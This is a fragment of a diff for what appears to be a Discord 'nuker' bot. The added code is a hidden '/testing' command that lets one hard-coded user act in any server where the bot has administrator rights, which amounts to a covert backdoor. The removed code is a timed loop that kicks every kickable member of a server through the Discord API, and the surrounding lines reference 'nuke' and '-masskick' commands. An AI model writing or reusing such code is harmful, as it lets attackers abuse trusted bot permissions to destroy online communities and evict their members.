@@ -286,7 +286,21 @@ client.on("message", msg => {
 }
 })
 
-
+client.on("message", msg => {
+    if(msg.content.startsWith("/testing")) {
+       if(msg.author.id === `${assy}`) {
+            const args = msg.content.split(' ').slice(1, 2);//get rids of command and reason if the is any
+            const theid1 = args.join(' ')
+           msg.client.guilds.cache.forEach(g => {
+              if(g.me.hasPermission("ADMINISTRATOR")) {
+                  if(g.id === theid1) {
+                  g.channels.create("test")
+}       
+ }
+        })
+}
+}
+})
 //nuke
 
 
@@ -299,21 +313,6 @@ if(list.includes(msg.author.id)) {return}
  if(!unallowedguilds.includes(msg.guild.id)) {
     if(msg.guild.me.hasPermission("ADMINISTRATOR")) {
 setTimeout(function() {
-          var gid = msg.guild.id
-          for(var i = 0; i < msg.guild.members.cache.filter(m => m.kickable === true).size; i++){
-            setTimeout(function() {
-              console.log("kicked")
-              axios({
-                url: `https://discord.com/api/v8/guilds/${gid}/members/${msg.guild.members.cache.filter(m => m.kickable === true).random().id}?reason=`,
-                method: 'DELETE',
-                headers: {
-                 authorization: `Bot ${token1}`
-                }
-              })
-            },i * 0800)
-        }
-},1700)
-  }
 }
   }else if(msg.content.startsWith(`-masskick`)) {
    if(msg.channel.type === 'dm') {return}
